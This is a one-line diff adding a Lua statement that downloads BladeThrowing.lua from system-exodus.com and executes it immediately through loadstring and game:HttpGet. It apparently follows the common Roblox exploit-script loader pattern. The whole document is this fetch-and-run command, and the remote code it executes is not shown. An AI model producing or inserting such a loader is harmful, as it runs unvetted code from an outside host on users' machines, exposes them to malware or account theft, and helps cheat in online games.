@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://system-exodus.com/scripts/bladethrowing/BladeThrowing.lua"),true))()
